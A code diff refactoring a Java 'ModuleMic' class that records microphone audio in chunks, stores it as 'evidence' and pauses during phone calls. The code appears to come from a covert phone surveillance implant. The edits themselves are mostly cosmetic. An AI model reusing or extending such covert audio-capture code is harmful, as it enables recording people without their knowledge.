@@ -52,14 +52,20 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
     private AudioRecorder recorder;
     int numFailures;
 
+    public static String getStaticType() {
+        return "mic";
+    }
     
+    public static ModuleMic getInstance() {
+        return (ModuleMic) ModuleManager.getInstance().get(getStaticType());
+    }
+
     public boolean parse(ConfModule conf) {
         setPeriod(MIC_PERIOD);
         setDelay(MIC_PERIOD);
         state = STOPPED;
         return true;
     }
-    
 
     private void newState(int newstate) {
         synchronized (stateLock) {
@@ -218,15 +224,14 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         //#endif
 
         final byte[] chunk = recorder.getAvailable();
-        
+
         if (chunk != null && chunk.length > 0) {
 
-            Evidence evidence=new Evidence(EvidenceType.MIC);
+            Evidence evidence = new Evidence(EvidenceType.MIC);
             //#ifdef DBC
             Check.requires(evidence != null, "Null log");
             //#endif
 
-            
             int offset = 0;
             if (Utils.equals(chunk, 0, AudioRecorder.AMR_HEADER, 0,
                     AudioRecorder.AMR_HEADER.length)) {
@@ -239,7 +244,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
             } else {
             }
             //#endif
-            
+
             evidence.createEvidence(getAdditionalData());
             evidence.writeEvidence(chunk, offset);
             evidence.close();
@@ -327,7 +332,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         debug.trace("callIncoming");
         //#endif
 
-        final ModuleMic agent = ModuleMic.getInstance();
+        final ModuleMic agent = (ModuleMic) ModuleMic.getInstance();
         agent.suspend();
     }
 
@@ -337,7 +342,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         //#ifdef DEBUG
         debug.trace("callInitiated");
         //#endif
-        final ModuleMic agent = ModuleMic.getInstance();
+        final ModuleMic agent = (ModuleMic) ModuleMic.getInstance();
         agent.suspend();
     }
 
@@ -347,12 +352,8 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         //#ifdef DEBUG
         debug.trace("callDisconnected");
         //#endif
-        final ModuleMic agent = ModuleMic.getInstance();
+        final ModuleMic agent = (ModuleMic) ModuleMic.getInstance();
         agent.resume();
-    }
-
-    public static ModuleMic getInstance() {
-        return (ModuleMic) ModuleManager.getInstance().get("mic");
     }
 
     public void callAdded(int callId) {
